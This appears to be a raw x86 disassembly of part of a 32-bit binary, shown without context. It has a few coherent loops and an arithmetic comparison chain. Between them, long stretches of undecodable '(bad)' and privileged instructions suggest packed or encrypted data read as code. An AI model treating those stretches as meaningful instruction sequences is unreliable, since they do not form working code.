  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403adc
  403acb:	outs   dx,DWORD PTR cs:[esi]
  403acd:	out    dx,al
  403ace:	and    BYTE PTR [eax],dl
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b22
  403ad7:	je     0x403b2e
  403ad9:	outs   dx,DWORD PTR ds:[esi]
  403ada:	cmp    dh,BYTE PTR [ebx-0x4]
  403add:	out    0x81,eax
  403adf:	int    0xa3
  403ae1:	xlat   BYTE PTR ss:[ebx]
  403ae3:	adc    cl,BYTE PTR [ecx]
  403ae5:	sar    BYTE PTR [ebp-0x4ba6897f],0x6e
  403aec:	xor    esi,DWORD PTR [edx]
  403aee:	adc    al,0x4f
  403af0:	and    eax,0xd8302929
  403af5:	or     BYTE PTR [esi-0x15],dh
  403af8:	sbb    dl,BYTE PTR [ecx+0x50e5b1ad]
  403afe:	pop    ds
  403aff:	fdivp  st(7),st
  403b01:	cmp    dh,BYTE PTR [ebp+0x4bedcab4]
  403b07:	dec    ah
  403b09:	jnp    0x403ae5
  403b0b:	add    dh,BYTE PTR [esi+0x50]
  403b0e:	test   eax,0xa3461c37
  403b13:	js     0x403b53
  403b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b16:	dec    edi
  403b17:	xor    DWORD PTR [ecx+0x18],esp
  403b1a:	test   BYTE PTR [eax],ah
  403b1c:	xor    eax,0x7d4e4afd
  403b21:	inc    esp
  403b22:	outs   dx,BYTE PTR ds:[esi]
  403b23:	(bad)  
  403b24:	push   edi
  403b25:	push   edi
  403b26:	call   0xcee72f5c
  403b2b:	jmp    0x403ac1
  403b2d:	jnp    0x403ba8
  403b2f:	stc    
  403b30:	mov    ebp,0x971c1945
  403b35:	sub    bh,bl
  403b37:	clc    
  403b38:	xor    BYTE PTR [ecx+0x68],dh
  403b3b:	push   0xfffffff3
  403b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b3e:	hlt    
  403b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b40:	jae    0x403b1b
  403b42:	adc    BYTE PTR [ebp-0x40],ch
  403b45:	mov    esp,0xb81f53b5
  403b4a:	es retf 
  403b4c:	fcomp  QWORD PTR [eax]
  403b4e:	mov    ebx,0x3f51f7
  403b53:	int3   
  403b54:	(bad)  
  403b56:	es leave 
  403b58:	jns    0x403bc6
  403b5a:	pop    esp
  403b5b:	or     BYTE PTR [edi],0x67
  403b5e:	test   eax,0x578509e9
  403b63:	popa   
  403b64:	inc    ecx
  403b65:	fwait
  403b66:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  403b68:	dec    esp
  403b69:	xchg   esi,eax
  403b6a:	sub    eax,0x5371bab4
  403b6f:	xchg   ecx,edx
  403b71:	cmp    DWORD PTR [edx],ebp
  403b73:	jmp    0x403b05
  403b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b76:	adc    eax,0x8da30fd8
  403b7b:	jecxz  0x403b4f
  403b7d:	scas   al,BYTE PTR es:[edi]
  403b7e:	dec    ebx
  403b7f:	pop    eax
  403b80:	dec    eax
  403b81:	pop    ebp
  403b82:	retf   0xae4d
  403b85:	dec    eax
  403b86:	fcomp  DWORD PTR [esi+edx*4-0x4e]
  403b8a:	dec    ebx
  403b8b:	ja     0x403b85
  403b8d:	push   cs
  403b8e:	shl    BYTE PTR [eax-0x7d],1
  403b91:	mov    ds:0x4a649f74,al
  403b96:	icebp  
  403b97:	test   DWORD PTR [esi+0x119a8dfe],ebp
  403b9d:	in     al,0xbf
  403b9f:	pop    ecx
  403ba0:	inc    esp
  403ba1:	enter  0x9ef,0x5a
  403ba5:	or     eax,0xf820a755
  403baa:	ins    BYTE PTR es:[edi],dx
  403bab:	or     eax,0x7df85f48
  403bb0:	pop    esi
  403bb1:	ficomp DWORD PTR [edi]
  403bb3:	(bad)  
  403bb4:	in     al,dx
  403bb5:	loope  0x403bd6
  403bb7:	add    DWORD PTR [edi-0x2e05ec6c],edx
  403bbd:	ret    0x4fbd
  403bc0:	dec    eax
  403bc1:	sub    BYTE PTR [eax+0x45f88d1d],ch
  403bc7:	ret    0xf409
  403bca:	not    eax
  403bcc:	dec    ebx
  403bcd:	sub    BYTE PTR [ebx+0x7d56da82],0x84
  403bd4:	call   0x4a0ebfaa
  403bd9:	inc    ebp
  403bda:	ret    
  403bdb:	nop
  403bdc:	icebp  
  403bdd:	jae    0x403c54
  403bdf:	loopne 0x403c5b
  403be1:	aas    
  403be2:	lock mov edi,ds
  403be5:	jmp    0x86493552
  403bea:	cmp    DWORD PTR [esi-0x4210e08b],eax
  403bf0:	mov    ebp,0xcbf455a0
  403bf5:	cmp    BYTE PTR [ebp+0x51f40340],0x5
  403bfc:	mov    ds:0x80886fed,eax
  403c01:	adc    ch,BYTE PTR [ebp-0x1c]
  403c04:	jl     0x403c4b
  403c06:	(bad)
  403c09:	pop    es
  403c0a:	add    cl,BYTE PTR [ebp-0x5e47ee16]
  403c10:	mov    ah,0x29
  403c12:	dec    edi
  403c13:	lock call ecx
  403c16:	outs   dx,DWORD PTR ds:[esi]
  403c17:	sti    
  403c18:	fwait
  403c19:	arpl   WORD PTR [edi-0x7e21e78d],bx
  403c1f:	push   esp
  403c20:	jp     0x403c1a
  403c22:	inc    esp
  403c23:	ds xchg edi,eax
  403c25:	out    0xfd,eax
  403c27:	xor    al,0xf5
  403c29:	sbb    eax,0xd4b0a7c4
  403c2e:	dec    ecx
  403c2f:	mov    cl,0x91
  403c31:	ror    BYTE PTR [edi+0x6e62866],cl
  403c37:	ss cmp al,0x87
  403c3a:	pop    ss
  403c3b:	outs   dx,DWORD PTR ds:[esi]
  403c3c:	cmp    BYTE PTR [edx+0x7b15aff8],dl
  403c42:	aas    
  403c43:	cmp    dh,al
  403c45:	and    edx,DWORD PTR [ebx-0x59ce14aa]
  403c4b:	not    BYTE PTR [ebp+edi*8-0x674c9e87]
  403c52:	(bad)  
  403c53:	jl     0x403ca2
  403c55:	pusha  
  403c56:	dec    esi
  403c57:	cdq    
  403c58:	push   esp
  403c59:	pop    ss
  403c5a:	fsin   
  403c5c:	stos   BYTE PTR es:[edi],al
  403c5d:	ret    
  403c5e:	les    ebp,FWORD PTR [ebx-0x7f]
  403c61:	jmp    0x403bf5
  403c63:	jp     0x403cbf
  403c65:	mov    ah,0x58
  403c67:	xor    al,0xe
  403c69:	fsubr  DWORD PTR [edi-0x56]
  403c6c:	shr    bh,cl
  403c6e:	lahf   
  403c6f:	stos   BYTE PTR es:[edi],al
  403c70:	and    al,0xd
  403c72:	mov    edx,esi
  403c74:	in     eax,0xd5
  403c76:	mov    ch,0xd8
  403c78:	(bad)  
  403c79:	and    al,bl
  403c7b:	dec    ebx
  403c7c:	push   es
  403c7d:	sub    ah,BYTE PTR [edi-0x9]
  403c80:	fdiv   QWORD PTR [esi]
  403c82:	lods   eax,DWORD PTR ds:[esi]
  403c83:	and    al,0x73
  403c85:	gs jecxz 0x403c37
  403c88:	xchg   esi,eax
  403c8a:	mov    al,0x22
  403c8c:	mov    DWORD PTR [esi],0x622ca5ff
  403c92:	mov    eax,ds:0xa0adfe09
  403c97:	fadd   QWORD PTR [eax+0x31]
  403c9a:	int3   
  403c9b:	mov    esp,0xbe56f432
  403ca0:	dec    ebx
  403ca1:	adc    dl,BYTE PTR [edx+edi*4]
  403ca4:	xor    DWORD PTR [ebx],eax
  403ca6:	add    al,0x58
  403ca8:	jno    0x403ce7
  403caa:	jae    0x403cdf
  403cac:	aaa    
  403cad:	out    0xf,eax
  403caf:	mov    es,eax
  403cb1:	mov    al,ds:0x20c1a0c
  403cb6:	dec    edx
  403cb7:	rcl    esi,0xf5
  403cba:	mov    al,ds:0x4a3f043
  403cbf:	bound  esi,QWORD PTR [ebp+0x43]
  403cc2:	(bad)  
  403cc3:	jl     0x403c8a
  403cc5:	test   BYTE PTR [eax+0x5b],bh
  403cc8:	fild   DWORD PTR [eax-0x220b6caa]
  403cce:	rol    ebp,cl
  403cd0:	addr16 sbb ebx,edx
  403cd3:	fdivr  DWORD PTR [esi]
  403cd5:	ins    BYTE PTR es:[edi],dx
  403cd6:	push   ds
  403cd7:	cld    
  403cd8:	xchg   ebx,eax
  403cd9:	std    
  403cda:	fwait
  403cdb:	mov    ?,WORD PTR [esp+ecx*2+0x57]
  403cdf:	pop    edx
  403ce0:	sub    bl,BYTE PTR [eax]
  403ce2:	in     eax,0xb8
  403ce4:	(bad)  
  403ce5:	out    dx,eax
  403ce6:	dec    edx
  403ce7:	aas    
  403ce8:	ret    
  403ce9:	inc    edx
  403cea:	cmp    esi,esp
  403cec:	daa    
  403ced:	imul   ebx,DWORD PTR [ecx-0xd97541e],0xffffffb3
  403cf4:	out    dx,eax
  403cf5:	ret    0x6833
  403cf8:	sub    DWORD PTR [eax+0x1a1c6f67],edx
  403cfe:	inc    ebx
  403cff:	xchg   DWORD PTR [esi],esp
  403d01:	xchg   BYTE PTR [edx+0x2c],cl
  403d04:	dec    edx
  403d05:	and    BYTE PTR [ebx-0x4792c9d],bh
  403d0b:	mov    al,0xe5
  403d0d:	sbb    dh,dh
  403d0f:	add    al,0xc1
  403d11:	cdq    
  403d12:	call   0xfc7c:0x332ec1a4
  403d19:	pop    ebp
  403d1a:	iret   
  403d1b:	jbe    0x403d28
  403d1d:	mov    ?,WORD PTR [edx+ebp*1+0x7203fbe2]
  403d24:	pop    ecx
  403d25:	daa    
  403d26:	adc    ecx,DWORD PTR [esi+edi*4-0x17]
  403d2a:	xor    ebx,DWORD PTR ds:0xf734f95
  403d30:	push   eax
  403d31:	inc    edx
  403d32:	mov    ebp,0x5a71e1a3
  403d37:	jmp    0x403d86
  403d39:	inc    ebp
  403d3a:	jl     0x403d47
  403d3c:	test   BYTE PTR cs:[edx+0x23488f8d],ch
  403d43:	push   edx
  403d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d45:	lock pop ss
  403d47:	(bad)  
  403d48:	xlat   BYTE PTR ds:[ebx]
  403d49:	ret    0xc4d4
  403d4c:	popfw  
  403d4e:	mov    ds:0x1e4fb327,eax
  403d53:	loopne 0x403d0c
  403d55:	xlat   BYTE PTR ds:[ebx]
  403d56:	mov    esi,gs
  403d58:	aas    
  403d59:	popa   
  403d5a:	mov    ebp,0x8ca7c16f
  403d5f:	bound  ebx,QWORD PTR [esi+0x2f]
  403d62:	pop    ecx
  403d63:	xchg   edx,edi
  403d65:	push   ebp
  403d66:	cli    
  403d67:	sbb    DWORD PTR [edx-0x62dcd9d7],esp
  403d6d:	scas   al,BYTE PTR es:[edi]
  403d6e:	or     BYTE PTR [eax+0x67881b3c],ch
  403d74:	out    dx,al
  403d75:	dec    ecx
  403d76:	icebp  
  403d77:	ss jno 0x403d00
  403d7a:	test   al,0x35
  403d7c:	push   0xffffffdc
  403d7e:	dec    esp
  403d7f:	icebp  
  403d80:	ret    
  403d81:	pop    esi
  403d82:	addr16 push ss
  403d84:	jns    0x403d8c
  403d86:	inc    edi
  403d87:	xchg   ebx,edi
  403d89:	out    0x78,eax
  403d8b:	pmullw mm7,QWORD PTR [edi+eax*2+0x5a37ebf2]
  403d93:	cmp    ecx,esp
  403d95:	jns    0x403d88
  403d97:	stc    
  403d98:	cwde   
  403d99:	push   es
  403d9a:	xchg   DWORD PTR [edi],edx
  403d9c:	int    0xc4
  403d9e:	in     al,0x9e
  403da0:	popf   
  403da1:	cmp    ebp,eax
  403da3:	outs   dx,BYTE PTR ds:[esi]
  403da4:	or     ecx,DWORD PTR [edi-0x29]
  403da7:	inc    edi
  403da8:	pop    esp
  403da9:	jg     0x403d2b
  403dab:	cmc    
  403dac:	mov    cl,0xa
  403dae:	mov    dh,0xb0
  403db0:	push   edx
  403db1:	(bad)  
  403db2:	enter  0x6232,0x2c
  403db6:	pop    ecx
  403db7:	jbe    0x403d66
  403db9:	test   al,0x6b
  403dbb:	inc    ecx
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffa9
  403e75:	leave  
  403e76:	cmp    DWORD PTR [edx+0x7e7e1f0a],edi
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403ee4
  403e81:	add    BYTE PTR [ebx],dh
  403e83:	add    ch,0xf9
  403e86:	bound  esp,QWORD PTR [edx-0x75]
  403e89:	enter  0xb9f3,0x8c
  403e8d:	dec    edi
  403e8e:	xor    BYTE PTR [eax],0x7b
  403e91:	push   ecx
  403e92:	in     al,0xc3
  403e94:	popf   
  403e95:	xchg   edx,ebp
  403e97:	loopne 0x403e9c
  403e99:	inc    esi
  403e9a:	les    esi,FWORD PTR [ebp-0x3e82a644]
  403ea0:	push   0xffffff80
  403ea2:	(bad)  [eax+0x2e052c7a]
  403ea8:	cld    
  403ea9:	xchg   BYTE PTR [ebx+0x65],cl
  403eac:	xor    ch,dh
  403eae:	retf   0xf990
  403eb1:	push   ds
  403eb2:	push   ebx
  403eb3:	mov    esi,0x129063f1
  403eb8:	add    bh,bh
  403eba:	xchg   esp,eax
  403ebb:	in     al,0xe8
  403ebd:	xchg   edi,eax
  403ebe:	fmul   QWORD PTR [edx+edx*2+0x51]
  403ec2:	pop    esi
  403ec3:	cmc    
  403ec4:	push   0x53924c0
  403ec9:	hlt    
  403eca:	in     al,0xb0
  403ecc:	out    0x7a,eax
  403ece:	add    dh,BYTE PTR [ecx+ecx*1]
  403ed1:	pop    ecx
  403ed2:	lods   eax,DWORD PTR ds:[esi]
  403ed3:	nop
  403ed4:	dec    esi
  403ed5:	ja     0x403f2d
  403ed7:	ficom  WORD PTR [edi]
  403ed9:	into   
  403eda:	ret    0x3f6b
  403edd:	xchg   esi,eax
  403ede:	repnz mov al,ds:0x1e6e949b
  403ee4:	sbb    al,0x5
  403ee6:	push   0x61
  403ee8:	push   ebp
  403ee9:	shl    DWORD PTR [ecx+0x7a],cl
  403eec:	loopne 0x403ea5
  403eee:	xchg   esp,eax
  403eef:	das    
  403ef0:	mov    eax,DWORD PTR [edi+0x7cf75a87]
  403ef6:	stc    
  403ef7:	imul   ebp,DWORD PTR [edx+0x71],0xc
  403efb:	sub    ch,BYTE PTR [edi+0x31]
  403efe:	xchg   edx,eax
  403eff:	sub    DWORD PTR [ecx+0x7eeb9925],edi
  403f05:	pop    ds
  403f06:	push   0xffffffcb
  403f08:	inc    eax
  403f09:	outs   dx,DWORD PTR ds:[esi]
  403f0a:	loope  0x403efd
  403f0c:	dec    eax
  403f0d:	sbb    cl,BYTE PTR [edx]
  403f0f:	mov    ah,0xce
  403f11:	int3   
  403f12:	jo     0x403ede
  403f14:	and    eax,0x4993761c
  403f19:	popa   
  403f1a:	popf   
  403f1b:	or     dl,BYTE PTR [esi+eax*2]
  403f1e:	fs stos BYTE PTR es:[edi],al
  403f20:	sti    
  403f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f22:	out    dx,al
  403f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f24:	cmp    DWORD PTR [edi],esi
  403f26:	les    ebp,FWORD PTR [esi]
  403f28:	stos   BYTE PTR es:[edi],al
  403f29:	or     cl,BYTE PTR [ebx+eiz*2+0x32]
  403f2d:	fidiv  WORD PTR [edi-0x486c7c5d]
  403f33:	into   
  403f34:	in     al,dx
  403f35:	pop    ds
  403f36:	or     DWORD PTR [edx+0x2c9bca6],ebp
  403f3c:	(bad)
  403f3f:	loope  0x403f3c
  403f41:	mov    al,0xaf
  403f43:	ja     0x403f18
  403f45:	xchg   edi,eax
  403f46:	dec    edx
  403f47:	lds    eax,FWORD PTR [ecx+0x53]
  403f4a:	sbb    eax,0x177bb507
  403f4f:	inc    esp
  403f50:	out    dx,al
  403f51:	mov    esi,ebx
  403f53:	and    ecx,esp
  403f55:	inc    edi
  403f56:	std    
  403f57:	fisub  DWORD PTR [edx-0x76]
  403f5a:	mov    ecx,0xc4bdc3f7
  403f5f:	inc    edx
  403f60:	(bad)  
  403f61:	dec    ecx
  403f62:	mov    cl,0xbd
  403f64:	adc    DWORD PTR [ebx-0x69],ebp
  403f67:	retf   
  403f68:	adc    dl,BYTE PTR [ecx+0x19]
  403f6b:	lock idiv BYTE PTR [eax]
  403f6e:	adc    eax,0x8510a4af
  403f73:	xchg   ecx,eax
  403f74:	jecxz  0x403fa5
  403f76:	add    DWORD PTR [ecx+0x40],esi
  403f79:	or     eax,0x623bc74e
  403f7e:	push   ebx
  403f7f:	xchg   esi,ecx
  403f81:	repnz iret 
  403f83:	out    0xbb,al
  403f85:	sbb    BYTE PTR [esi+0x64],al
  403f88:	push   0xffffffce
  403f8a:	lock and cl,BYTE PTR [edx]
  403f8d:	pusha  
  403f8e:	push   0x70
  403f90:	mov    WORD PTR [eax-0x345f4dd1],ss
  403f96:	push   0x641f0164
  403f9b:	inc    esi
  403f9c:	push   0xffffff94
  403f9e:	lock add eax,0x62e9cc95
  403fa4:	test   al,0x48
  403fa6:	fsubr  QWORD PTR [ecx+0x436d760b]
  403fac:	mov    edi,DWORD PTR [edi+0x6f]
  403faf:	and    cl,BYTE PTR [ebp+0x368d174e]
  403fb5:	dec    ecx
  403fb6:	push   ebx
  403fb7:	ret    0x3b71
  403fba:	or     DWORD PTR [esi+0x26da416a],ebp
  403fc0:	mov    cr6,ebp
  403fc3:	sbb    BYTE PTR [ebx+0x0],ah
  403fc6:	cmp    eax,0x14234255
  403fcb:	(bad)  
  403fcc:	bound  ebp,QWORD PTR [esi+ebp*1-0x11c569]
  403fd3:	in     eax,0x38
  403fd5:	xor    edx,DWORD PTR [ebx-0x3b]
  403fd8:	in     eax,dx
  403fd9:	push   ecx
  403fda:	jmp    0xc69c:0x53b29b67
  403fe1:	repz jo 0x404011
  403fe4:	cdq    
  403fe5:	sub    dh,cl
  403fe7:	xor    ah,BYTE PTR [esi+0x62797f71]
  403fed:	add    DWORD PTR [edi+0x40],edx
  403ff0:	inc    esi
  403ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff2:	pop    ds
  403ff3:	dec    edi
  403ff4:	lods   eax,DWORD PTR ds:[esi]
  403ff5:	sub    BYTE PTR [esi],dl
  403ff7:	jbe    0x40400a
  403ff9:	icebp  
  403ffa:	ret    0x8a2a
  403ffd:	lahf   
  403ffe:	not    dh
  404000:	(bad)  
  404001:	push   0xfffffffd
  404003:	enter  0x7eb4,0xd
  404007:	cli    
  404008:	and    ebx,DWORD PTR [ecx-0x73008aa9]
  40400e:	add    ecx,esi
  404010:	dec    edi
  404011:	aas    
  404012:	(bad)  
  404013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404014:	bound  ebp,QWORD PTR [esi]
  404016:	xor    al,0xde
  404018:	cmp    ch,dh
  40401a:	add    eax,0x36a0b92d
  40401f:	scas   eax,DWORD PTR es:[edi]
  404020:	jnp    0x40405d
  404022:	dec    eax
  404023:	inc    edi
  404024:	and    eax,0x619282ff
  404029:	shl    BYTE PTR [edx-0x521b98f7],1
  40402f:	and    al,0xa8
  404031:	ds mov ebx,0x681fb3ca
  404037:	fimul  WORD PTR [ebp-0x55]
  40403a:	pushf  
  40403b:	in     al,dx
  40403c:	or     BYTE PTR [esi],ch
  40403e:	mov    bl,0x94
  404040:	scas   al,BYTE PTR es:[edi]
  404041:	div    edi
  404043:	outs   dx,DWORD PTR ds:[esi]
  404044:	pop    ebp
  404045:	push   ss
  404046:	jg     0x403ff0
  404048:	lea    ebx,[esi+edx*1-0x2a]
  40404c:	shl    edi,0x18
  40404f:	pop    edi
  404050:	ja     0x404048
  404052:	mov    esi,0x377cd202
  404057:	dec    esp
  404058:	loopne 0x40409b
  40405a:	sti    
  40405b:	and    al,0x78
  40405d:	stc    
  40405e:	or     al,bh
  404060:	ret    
  404061:	shl    DWORD PTR [ebp-0xcbb68e1],0xe
  404068:	ja     0x40409e
  40406a:	les    edx,FWORD PTR [ebp+0x38f117fd]
  404070:	pop    es
  404071:	dec    ebx
  404072:	shr    DWORD PTR [edx-0x67],cl
  404075:	pop    edx
  404076:	dec    edi
  404077:	add    eax,0x670d1df
  40407c:	imul   edi,DWORD PTR ds:0xff785375,0x19
  404083:	xlat   BYTE PTR ds:[ebx]
  404084:	ret    0x94d5
  404087:	adc    dh,ch
  404089:	pop    eax
  40408a:	dec    ecx
  40408b:	loope  0x40409f
  40408d:	mov    BYTE PTR [edi-0x7a],cl
  404090:	lds    edi,FWORD PTR [ebx]
  404092:	push   esi
  404093:	(bad)  
  404094:	sbb    eax,0x8f532fb0
  404099:	cmp    edx,DWORD PTR [eax-0xf74f76e]
  40409f:	inc    esp
  4040a0:	fisubr WORD PTR [esi+ecx*2-0x1ac4e119]
  4040a7:	outs   dx,DWORD PTR ds:[esi]
  4040a8:	jl     0x404080
  4040aa:	or     al,0xcf
  4040ac:	push   esi
  4040ad:	cmp    BYTE PTR [ecx+0xe],dh
  4040b0:	mov    al,0x58
  4040b2:	ja     0x4040e7
  4040b4:	mov    ecx,0x20f3c6f1
  4040b9:	stc    
  4040ba:	stos   BYTE PTR es:[edi],al
  4040bb:	or     eax,0xa7551e58
  4040c0:	(bad)  
  4040c1:	cld    
  4040c2:	mov    ah,0xf9
  4040c4:	push   ss
  4040c5:	xor    BYTE PTR [edx-0x21cd8562],al
  4040cb:	pop    es
  4040cc:	imul   ebp,DWORD PTR [edi-0x1d576bb7],0x553f89bd
  4040d6:	loopne 0x40410d
  4040d8:	mov    ch,0x73
  4040da:	inc    eax
  4040db:	inc    eax
  4040dc:	pop    eax
  4040dd:	jne    0x404100
  4040df:	add    eax,0x2b2591d
  4040e4:	mov    ds:0xe7aaa8a8,eax
  4040e9:	jmp    0x4eab:0x3d0579ca
  4040f0:	add    eax,0x3bf16285
  4040f5:	mov    ebp,0x9ee6fabc
  4040fa:	sbb    al,0x7c
  4040fc:	neg    BYTE PTR [edx]
  4040fe:	(bad)  
  4040ff:	cmp    ah,dh
  404101:	inc    ebp
  404102:	xor    cl,ch
  404104:	add    ch,ah
  404106:	out    dx,al
  404107:	push   ecx
  404108:	dec    edx
  404109:	jb     0x404098
  40410b:	arpl   WORD PTR ds:0x4c56a14e,sp
  404111:	ins    BYTE PTR es:[edi],dx
  404112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404113:	mov    ch,0xe0
  404115:	or     bl,0x20
  404118:	fisub  DWORD PTR [edx]
  40411a:	sub    ecx,DWORD PTR [bx+si-0x12]
  40411e:	push   ecx
  40411f:	mov    ch,0x6d
  404121:	mov    bh,0x1b
  404123:	xor    al,0xe
  404125:	hlt    
  404126:	jo     0x40412f
  404128:	jae    0x4040d6
  40412a:	sbb    edi,edi
  40412c:	lods   eax,DWORD PTR ds:[esi]
  40412d:	gs aad 0xf6
  404130:	add    BYTE PTR [eax+0x13436d17],dh
  404136:	jl     0x4040be
  404138:	clc    
  404139:	fwait
  40413a:	and    al,0xcc
  40413c:	popa   
  40413d:	xor    al,0x94
  40413f:	dec    esi
  404140:	pop    esp
  404141:	aas    
  404142:	dec    ebp
  404143:	mov    ch,0xf9
  404145:	jae    0x404140
  404147:	mov    esi,0x2872016b
  40414c:	(bad)  
  40414d:	loope  0x404111
  40414f:	or     al,0xdf
  404151:	scas   al,BYTE PTR es:[edi]
  404152:	retf   0x74e0
  404155:	popa   
  404156:	sub    esi,ebx
  404158:	fwait
  404159:	js     0x4040f1
  40415b:	mov    ds:0x8a22e33d,eax
  404160:	dec    ebp
  404161:	imul   edi,DWORD PTR [eax],0x2b4afacf
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [ebp+0x74e99053],al
  40418f:	sbb    eax,0x7c587e7e
  404194:	jle    0x404214
  404196:	fidivr DWORD PTR [bp+di-0x15]
  40419a:	rol    DWORD PTR [esi],0x85
  40419d:	shl    DWORD PTR [esi],cl
  40419f:	cdq    
  4041a0:	fnstenv [ebp-0x59]
  4041a3:	pop    es
  4041a4:	(bad)  
  4041a5:	jmp    0x9d1e:0x1fb00b54
  4041ac:	call   0xc040:0x1fe6e89e
  4041b3:	ins    DWORD PTR es:[edi],dx
  4041b4:	and    BYTE PTR [ecx+ebp*2+0x2783b4e4],0x13
  4041bc:	mov    ds:0x890c0b54,al
  4041c1:	mov    ah,0xa4
  4041c3:	push   ds
  4041c4:	cs (bad) 
  4041c6:	sbb    BYTE PTR [ebp+0x4cde207e],dl
  4041cc:	adc    esi,DWORD PTR [esi+ebx*1]
  4041cf:	add    eax,0x7320f771
  4041d4:	sub    eax,0xd4448da5
  4041d9:	jmp    0xb45b:0xc770df75
  4041e0:	addr16 push esp
  4041e2:	jns    0x4041ca
  4041e4:	ret    0x1346
  4041e7:	rcl    DWORD PTR [ecx+0x3bef01de],0xbd
  4041ee:	sti    
  4041ef:	push   ss
  4041f0:	xor    al,0xab
  4041f2:	pop    ebx
  4041f3:	cmp    eax,0x73fe2135
